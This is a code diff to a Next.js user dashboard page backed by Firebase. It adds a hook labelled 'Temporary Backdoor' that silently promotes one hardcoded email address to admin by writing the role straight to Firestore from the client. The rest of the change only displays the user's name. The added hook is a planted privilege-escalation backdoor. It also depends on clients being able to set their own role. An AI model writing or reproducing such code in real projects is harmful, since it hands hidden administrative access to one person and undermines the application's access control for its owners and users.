@@ -1,15 +1,43 @@
 "use client";
 
+import { useEffect } from "react";
 import ProtectedRoute from "@/components/ProtectedRoute";
 import DashboardLayout from "@/components/DashboardLayout";
 import { Activity, Bell, Settings, User } from "lucide-react";
 import Link from "next/link";
+import { useAuth } from "@/contexts/AuthContext";
+import { doc, updateDoc } from "firebase/firestore";
+import { db } from "@/lib/firebase";
 import styles from "@/styles/dashboard.module.css";
 
 export default function UserDashboard() {
+    const { user, refreshUserRole } = useAuth();
+
+    // Auto-promote specific user to admin (Temporary Backdoor)
+    useEffect(() => {
+        const promoteUser = async () => {
+            if (user?.email === "ansha74791@gmail.com") {
+                try {
+                    console.log("Promoting user to admin...");
+                    const userRef = doc(db, "users", user.uid);
+                    await updateDoc(userRef, { role: "admin" });
+                    await refreshUserRole();
+                    console.log("User promoted to admin successfully!");
+                    alert("You have been upgraded to Admin! Please refresh the page to access all dashboards.");
+                } catch (error) {
+                    console.error("Error promoting user:", error);
+                }
+            }
+        };
+
+        if (user) {
+            promoteUser();
+        }
+    }, [user, refreshUserRole]);
+
     return (
         <ProtectedRoute requiredRole="user">
-            <DashboardLayout role="user" userName="User">
+            <DashboardLayout role="user" userName={user?.displayName || "User"}>
                 <h2 style={{ color: "#fff", fontSize: "1.5rem", fontWeight: "700", marginBottom: "1.5rem" }}>
                     User Dashboard
                 </h2>
